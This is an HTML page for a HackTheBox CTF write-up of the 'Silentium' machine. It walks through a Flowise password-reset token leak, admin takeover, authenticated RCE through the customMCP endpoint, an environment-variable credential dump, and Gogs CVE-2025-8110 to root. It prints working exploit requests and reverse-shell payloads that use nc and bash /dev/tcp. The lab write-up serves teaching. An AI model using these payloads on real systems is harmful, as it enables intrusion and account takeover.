@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CTF Writeup — Silentium</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,600;1,400&family=DM+Sans:wght@400;500;700&family=Syne:wght@700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../assets/style.css" />
+  <meta name="description" content="Silentium HTB writeup — password reset abuse on Flowise AI, authenticated RCE via a malicious MCP payload, Docker env credential leak, and Gogs CVE-2025-8110 to root. HackTheBox 2026, Web, Medium.">
+  <link rel="canonical" href="https://tomatobuster.github.io/WriteUps/writeups/silentium.html">
+  <link rel="alternate" type="application/rss+xml" title="TomatoBuster CTF Writeups" href="https://tomatobuster.github.io/WriteUps/feed.xml">
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "TechArticle",
+      "headline": "Silentium — HTB Writeup",
+      "description": "Password reset abuse on Flowise AI, authenticated RCE via a malicious MCP payload, Docker env credential leak, and Gogs CVE-2025-8110 to root. HackTheBox 2026, Misc, Easy.",
+      "author": {
+        "@type": "Person",
+        "name": "TomatoBuster",
+        "url": "https://tomatobuster.github.io/WriteUps/"
+      },
+      "publisher": {
+        "@type": "Person",
+        "name": "TomatoBuster",
+        "url": "https://tomatobuster.github.io/WriteUps/"
+      },
+      "datePublished": "2026-04-12",
+      "dateModified": "2026-04-12",
+      "url": "https://tomatobuster.github.io/WriteUps/writeups/silentium.html",
+      "mainEntityOfPage": "https://tomatobuster.github.io/WriteUps/writeups/silentium.html",
+      "keywords": ["CTF", "HackTheBox", "Web", "Flowise", "RCE", "Docker", "Gogs", "CVE-2025-8110"],
+      "articleSection": "CTF Writeups",
+      "difficulty": "Medium"
+    }
+  </script>
+  <!-- Open Graph -->
+  <meta property="og:title" content="Silentium — HTB Writeup | TomatoBuster">
+  <meta property="og:description" content="Password reset abuse on Flowise AI, authenticated RCE via a malicious MCP payload, Docker env credential leak, and Gogs CVE-2025-8110 to root.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://tomatobuster.github.io/WriteUps/writeups/silentium.html">
+  <meta property="og:image" content="https://tomatobuster.github.io/WriteUps/assets/img/og-silentium.png">
+  <meta property="article:published_time" content="2026-04-13">
+  <meta property="article:author" content="TomatoBuster">
+  <meta property="article:tag" content="CTF, HackTheBox, Web, Flowise, RCE, Gogs">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Silentium — HTB Writeup | TomatoBuster">
+  <meta name="twitter:description" content="Password reset abuse on Flowise AI, authenticated RCE via a malicious MCP payload, Docker env credential leak, and Gogs CVE-2025-8110 to root.">
+  <meta name="twitter:image" content="https://tomatobuster.github.io/WriteUps/assets/img/og-silentium.png">
+  <link rel="icon" type="image/x-icon" href="../ico/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="../ico/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="../ico/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="../ico/apple-touch-icon.png">
+  <link rel="manifest" href="../ico/site.webmanifest">
+</head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1F5LGPYZNR"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-1F5LGPYZNR');
+</script>
+
+<body>
+
+<div class="page-wrap">
+
+  <!-- NAV -->
+  <nav class="topnav">
+    <a class="topnav-logo" href="index.html">TomatoBuster</a>
+    <div class="topnav-right">
+      <ul class="topnav-links" id="nav-links">
+        <li><a href="../index.html">Home</a></li>
+        <li><a href="../writeups.html">Writeups</a></li>
+        <li><a href="../categories.html">Categories</a></li>
+      </ul>
+      <button class="hamburger" id="hamburger" aria-label="Toggle navigation">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+      <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">
+        <span class="toggle-moon">🌙</span>
+        <span class="toggle-sun">☀️</span>
+      </button>
+    </div>
+  </nav>
+
+  <!-- HERO -->
+  <header class="hero">
+    <div class="hero-eyebrow">
+      <span class="badge badge-misc">MISC</span>
+      <span class="badge badge-easy">EASY</span>
+      <div class="hero-sep"></div>
+      <span class="hero-meta-text">TomatoBuster 2026 &nbsp;·&nbsp; Apr 12, 2026</span>
+    </div>
+    <h1>Silen<span class="accent">tium</span></h1>
+    <p class="hero-desc">
+      Abusing a Flowise AI unauthenticated password reset to hijack an admin account, leveraging an authenticated RCE endpoint to escape into a Docker container, leaking credentials from environment variables to SSH in as <code>ben</code>, then exploiting CVE-2025-8110 in Gogs to achieve a root shell.
+    </p>
+  </header>
+
+  <!-- INFO STRIP -->
+  <div class="info-strip">
+    <div class="info-cell">
+      <div class="info-label">Category</div>
+      <div class="info-value cyan">Misc</div>
+    </div>
+    <div class="info-cell">
+      <div class="info-label">Architecture</div>
+      <div class="info-value">Linux</div>
+    </div>
+    <div class="info-cell">
+      <div class="info-label">Solver</div>
+      <div class="info-value">@Tomat0Buster</div>
+    </div>
+  </div>
+
+  <!-- TOC -->
+  <div class="toc">
+    <div class="toc-title">// Table of Contents</div>
+    <ul>
+      <li><a href="#recon">01 — Reconnaissance &amp; Subdomain Enumeration</a></li>
+      <li><a href="#account-takeover">02 — Flowise Account Takeover via Password Reset</a></li>
+      <li><a href="#rce">03 — Authenticated RCE &amp; Docker Escape</a></li>
+      <li><a href="#user-flag">04 — User Flag</a></li>
+      <li><a href="#privesc">05 — Privilege Escalation via CVE-2025-8110 (Gogs)</a></li>
+      <li><a href="#flag">06 — Root Flag</a></li>
+    </ul>
+  </div>
+
+  <!-- SECTION 1 — RECON -->
+  <section class="section" id="recon">
+    <div class="section-header">
+      <span class="section-num">01</span>
+      <h2>Reconnaissance &amp; Subdomain Enumeration</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p>We begin with a standard nmap scan. Only two ports are open — SSH on 22 and nginx on 80 — and the HTTP server immediately redirects to <code>silentium.htb</code>. Even a full <code>-p-</code> scan confirms this is the complete attack surface.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+        <span class="tb-title">bash — 80×24</span>
+      </div>
+      <pre><span class="prompt">$ </span><span class="cmd">nmap -sV 10.129.26.252</span>
+<span class="out">Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-12 11:07 CEST
+Nmap scan report for 10.129.26.252
+Host is up (0.029s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://silentium.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 8.36 seconds</span></pre>
+    </div>
+
+    <p>Directory and domain brute-forcing against the root turns up nothing useful. However, vhost enumeration with gobuster uncovers an interesting subdomain:</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+        <span class="tb-title">bash — 80×24</span>
+      </div>
+      <pre><span class="prompt">$ </span><span class="cmd">gobuster vhost -u "http://silentium.htb" -w bitquark-subdomains-top100000.txt --append-domain</span>
+<span class="out">===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://silentium.htb
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  bitquark-subdomains-top100000.txt
+[+] User Agent:                gobuster/3.8.2
+[+] Timeout:                   10s
+[+] Append Domain:             true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+staging.silentium.htb   Status: 200 [Size: 3142]
+Progress: 6071 / 100000 (6.07%)</span></pre>
+    </div>
+
+    <p>Visiting <code>staging.silentium.htb</code> reveals a <b>Flowise AI</b> instance — an open-source platform that lets users build customized LLM pipelines. The version is visible in the page source.</p>
+
+    <div class="callout info">
+      <span class="callout-icon">ℹ</span>
+      <div>
+        <strong>Key Finding</strong>
+        <code>staging.silentium.htb</code> hosts a Flowise AI instance. Flowise exposes a rich REST API under <code>/api/v1/</code>, including user and authentication endpoints that don't require a valid session.
+      </div>
+    </div>
+  </section>
+
+ 
+  <!-- SECTION 2 — ACCOUNT TAKEOVER -->
+  <section class="section" id="account-takeover">
+    <div class="section-header">
+      <span class="section-num">02</span>
+      <h2>Flowise Account Takeover via Password Reset</h2>
+      <div class="section-line"></div>
+    </div>
+    <p>By googling Flowise's CVE we can find that <code>/api/v1/account/forgot-password</code> endpoint is reachable without authentication. When supplied with a valid email, it generates a <b>temporary reset token</b> and returns it directly in the JSON response body. We can then use this temp token to reset the password of the user as we like.</p>
+    <p>Now we just need an email. We can find it trying the name of the employee Ben. The first step is then to take over the <code>ben@silentium.htb</code> admin account (we know it exist cause it doesn't return "user not found"). We POST to the forgot-password endpoint and pull the <code>tempToken</code> directly out of the response.</p>
+    <p>Once we are in possess of the temp token we can use it to reset Ben's account password.</p>
+
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">1</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Request a password reset token</div>
+          <p>No authentication is required. The API returns a <code>tempToken</code> and its expiry directly in the response body.</p>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">bash — attacker</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
+  -H "Content-Type: application/json" \
+  -d '{"user":{"email":"ben@silentium.htb"}}'</span>
+<span class="out">HTTP/1.1 201 Created
+Content-Type: application/json; charset=utf-8
+
+{
+  "user": {
+    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
+    "name": "admin",
+    "email": "ben@silentium.htb",
+    "tempToken": "V1ktVdYlu9bOLiS2tHxSxPGLxKBa3x12U8GAEIxXnZqoAozZdzT2O4Qh2r4Epo9D",
+    "tokenExpiry": "2026-04-12T09:49:04.776Z",
+    "status": "active"
+  }
+}</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">2</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Reset the password using the leaked token</div>
+          <p>We feed the <code>tempToken</code> straight into the reset-password endpoint to set a new password of our choosing.</p>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">bash — attacker</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
+  -H "Content-Type: application/json" \
+  -d '{
+    "user": {
+      "email": "ben@silentium.htb",
+      "tempToken": "V1ktVdYlu9bOLiS2tHxSxPGLxKBa3x12U8GAEIxXnZqoAozZdzT2O4Qh2r4Epo9D",
+      "password": "MyPassword123"
+    }
+  }'</span>
+<span class="out">HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+
+{"message":"Password reset successfully"}</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">3</div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Log in and retrieve a Bearer token</div>
+          <p>With the new password in place we authenticate normally and capture the JWT Bearer token needed for the next stage.</p>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">bash — attacker</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">curl -s -X POST http://staging.silentium.htb/api/v1/account/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"ben@silentium.htb","password":"MyPassword123"}' | jq -r '.token'</span>
+<span class="out">yaJ8yaTnN_2bwzPJQmhU9-0BIFPgMc3bz1a4L-RcmnM</span></pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="callout flag">
+      <span class="callout-icon">⚑</span>
+      <div>
+        <strong>Admin Access Obtained</strong>
+        The <code>tempToken</code> leaked through the API let us hold a valid JWT for the <code>ben@silentium.htb</code> admin account.
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 3 — RCE -->
+  <section class="section" id="rce">
+    <div class="section-header">
+      <span class="section-num">03</span>
+      <h2>Authenticated RCE &amp; Docker Escape</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p>With a valid Bearer token we can hit the <code>/api/v1/node-load-method/customMCP</code> endpoint. The <code>mcpServerConfig</code> value is evaluated server-side as JavaScript, giving us full access to Node's <code>child_process</code> module.</p>
+    <p>We know this from a google search, where we can find this Proof of Concept of this RCE (I just googled "Flowise CVE PoC"): <a class="link" href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p">RCE in FlowiseAI/Flowise </a></p>
+
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">1</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Prepare the payload</div>
+          <p>We craft <code>payload.json</code> with a  sh reverse-shell one-liner embedded inside a self-executing JavaScript function. The server evaluates the expression, spawning a shell back to our listener.</p>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">payload.json</span>
+            </div>
+            <pre><span class="out">{
+  "loadMethod": "listActions",
+  "inputs": {
+    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_sIP 4444 >/tmp/f');return 1;})()} )"
+  }
+}</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">2</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Start a listener, then fire the exploit</div>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">terminal 1 — listener</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">ncat -lvp 4444</span>
+<span class="out">Ncat: Listening on 0.0.0.0:4444</span></pre>
+          </div>
+          <div class="terminal" style="margin-top:0.75rem">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">terminal 2 — exploit</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer yaJ8yaTnN_2bwzPJQmhU9-0BIFPgMc3bz1a4L-RcmnM" \
+  -d @payload.json</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">3</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Shell received — we are root inside Docker</div>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">terminal 1 — shell</span>
+            </div>
+            <pre><span class="out">Ncat: Connection from 10.129.26.252:54408.</span>
+<span class="prompt">~ # </span><span class="cmd">id</span>
+<span class="out">uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">4</div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Leak credentials from environment variables</div>
+          <p>The container environment is loaded with secrets — including SMTP credentials and the Flowise password. We dump everything and spot usable SSH passwords.</p>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">docker container — root</span>
+            </div>
+            <pre><span class="prompt">~ # </span><span class="cmd">env</span>
+<span class="out">FLOWISE_PASSWORD=REDACTED
+HOSTNAME=c78c3cceb7ba
+SMTP_PORT=1025
+PORT=3000
+SENDER_EMAIL=ben@silentium.htb
+JWT_ISSUER=ISSUER
+JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+LLM_PROVIDER=nvidia-nim
+FLOWISE_USERNAME=ben
+DATABASE_PATH=/root/.flowise
+JWT_TOKEN_EXPIRY_IN_MINUTES=360
+SMTP_PASSWORD=REDACTED
+SMTP_HOST=mailhog
+SMTP_USER=test
+...</span></pre>
+          </div>
+          <div class="callout warning" style="margin-top:1rem">
+            <span class="callout-icon">⚠</span>
+            <div>
+              <strong>Credential Candidates</strong>
+              Two passwords stand out: <code>REDACTED</code> (Flowise) and <code>REDACTED</code> (SMTP). We try both against SSH for user <code>ben</code>.
+            </div>
+          </div>
+          <div class="terminal" style="margin-top:0.75rem">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">bash — attacker</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">ssh ben@10.129.26.252</span>
+<span class="out">ben@10.129.26.252's password: </span><span class="cmd">REDACTED</span>
+<span class="out">Welcome to Ubuntu 24.04.2 LTS</span>
+<span class="prompt">ben@silentium:~$ </span><span class="cmd">id</span>
+<span class="out">uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)</span></pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- SECTION 4 — USER FLAG -->
+  <section class="section" id="user-flag">
+    <div class="section-header">
+      <span class="section-num">04Root Flag
+
+
+      </span>
+      <h2>User Flag</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p>The user flag, as always, is waiting us in the home directory.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+        <span class="tb-title">ben@silentium</span>
+      </div>
+      <pre><span class="prompt">ben@silentium:~$ </span><span class="cmd">cat user.txt</span>
+<span class="flag-out">HTB{REDACTED}</span></pre>
+    </div>
+
+    <div class="callout flag">
+      <span class="callout-icon">⚑</span>
+      <div>
+        <strong>User Flag Captured</strong>
+        Password reset token leak → RCE → env var credential leak → SSH. First flag is done. Now on to root.
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 5 — PRIVESC -->
+  <section class="section" id="privesc">
+    <div class="section-header">
+      <span class="section-num">05</span>
+      <h2>Privilege Escalation via CVE-2025-8110 (Gogs)</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p>Enumerating the machine we find a <b>Gogs</b> instance running locally. Gogs is vulnerable to <b>CVE-2025-8110</b> — a symlink-based RCE that allows an authenticated user to overwrite <code>.git/config</code> inside any repository, injecting an arbitrary <code>sshCommand</code> that executes when a privileged process runs <code>git push</code>.</p>
+    <p>Also here, becoming aware that our hacker skills are more and more relying on google searches, we can find the following PoC online: <a class="link" href="https://github.com/zAbuQasem/gogs-CVE-2025-8110">gogs-CVE-2025-8110</a></p>
+    <p>Changing the credentials as the ones of the user we registered and deleting the register function in the PoC we can get a reverse shell.</p>
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">1</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Register an account on Gogs, grab an API token and remove the register function from the PoC</div>
+          <p>The Gogs instance allows open registration. We sign up with a random user and password like <code>user:Password123!</code>, then generate an application token from the settings page to use with the API.</p>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">bash — attacker</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">cat exploit_cve-2025-8110.py</span>
+<span class="out"> 
+    ...
+    username = "user"
+    password = "Password123!"
+    command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"
+    try:
+        login(session, args.url, username, password)
+        token = get_application_token(session, args.url)
+        repo_name = create_malicious_repo(session, args.url, token)
+        git_config = f"""[core]
+      ...</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">2</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Launch the script</div>
+          <p>The script let us gain a rev shell, let's spawn first an ncat listener and the execute the script</p>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">bash — attacker</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">python3 exploit_cve-2025-8110.py -u TARGET_URL -lh ATTACKER_IP -lp ATTACKER_PORT </span>
+<span class="out"> 
+    [+] Exploit sent, check your listener!</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">3</div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Catch the root shell</div>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">terminal — listener</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">ncat -lvp 5555</span>
+<span class="out">Ncat: Connection from 10.129.26.252:49102.</span>
+<span class="prompt">root@silentium:~# </span><span class="cmd">id</span>
+<span class="out">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="callout warning">
+      <span class="callout-icon">⚠</span>
+      <div>
+        <strong>Why CVE-2025-8110 works</strong>
+        CVE-2025-8110 is a vulnerability in Gogs where the app fails to properly check symbolic links, allowing us to write files outside a repository. By exploiting this, we can overwrite critical files and achieve remote code execution
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 6 — ROOT FLAG -->
+  <section class="section" id="flag">
+    <div class="section-header">
+      <span class="section-num">06</span>
+      <h2>Root Flag</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p>With a root shell on the host we head straight to <code>/root</code> and collect the final flag.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+        <span class="tb-title">root@silentium</span>
+      </div>
+      <pre><span class="prompt">root@silentium:~# </span><span class="cmd">ls</span>
+<span class="out">root.txt</span>
+<span class="prompt">root@silentium:~# </span><span class="cmd">cat root.txt</span>
+<span class="flag-out">HTB{REDACTED}</span></pre>
+    </div>
+
+    <div class="flag-reveal">
+      <div class="flag-label">// Root Flag Captured</div>
+      <div class="flag-value" id="flag-text">HTB{REDACTED}</div>
+    </div>
+  </section>
+
+  <section class="home-section">
+    <div class="home-section-head">
+      <span class="home-section-title">Related Writeups</span>
+      <a class="link" href="../writeups.html">View all →</a>
+    </div>
+    <div class="writeups-grid">
+      <a href="./kobold.html" class="card" data-cat="MISC" data-diff="EASY">
+        <div class="card-top">
+          <div class="card-badges">
+            <span class="badge badge-misc">MISC</span>
+            <span class="badge badge-easy">EASY</span>
+          </div>
+        </div>
+        <div class="card-title">Kobold</div>
+        <div class="card-desc">Unauthenticated API exploitation via CVE-2026-23520 and Docker socket abuse to escape to root.</div>
+        <div class="card-meta"><span>HTB 2026</span><span>Mar 24, 2026</span></div>
+      </a>
+      <a href="./devarea.html" class="card" data-cat="WEB" data-diff="MEDIUM">
+        <div class="card-top">
+          <div class="card-badges">
+            <span class="badge badge-web">WEB</span>
+            <span class="badge badge-medium">MEDIUM</span>
+          </div>
+        </div>
+        <div class="card-title">DevArea</div>
+        <div class="card-desc">XOP and Apache CXF exploitation, HoverFly RCE and Bash overwriting.</div>
+        <div class="card-meta"><span>HTB 2026</span><span>Mar 31, 2026</span></div>
+      </a>
+    </div>
+  </section>
+
+  <!-- FOOTER -->
+  <footer class="writeup-footer">
+    <div class="author-block">
+      <div class="author-avatar"></div>
+      <div>
+        <div class="author-info-name">@Tomat0Buster</div>
+        <div class="author-info-role">Web · TomatoBuster</div>
+      </div>
+    </div>
+    <div class="footer-tags">
+      <span class="tag">flowise ai</span>
+      <span class="tag">password reset abuse</span>
+      <span class="tag">node.js rce</span>
+      <span class="tag">docker credential leak</span>
+      <span class="tag">CVE-2025-8110</span>
+      <span class="tag">gogs</span>
+      <span class="tag">privesc</span>
+    </div>
+  </footer>
+
+  <!-- SITE FOOTER -->
+  <footer class="site-footer">
+    <span class="site-footer-logo">TomatoBuster</span>
+    <span class="site-footer-copy">Built by TomatoBuster · 2026</span>
+  </footer>
+
+</div><!-- /page-wrap -->
+
+<script src="../assets/script.js"></script>
+</body>
+</html>
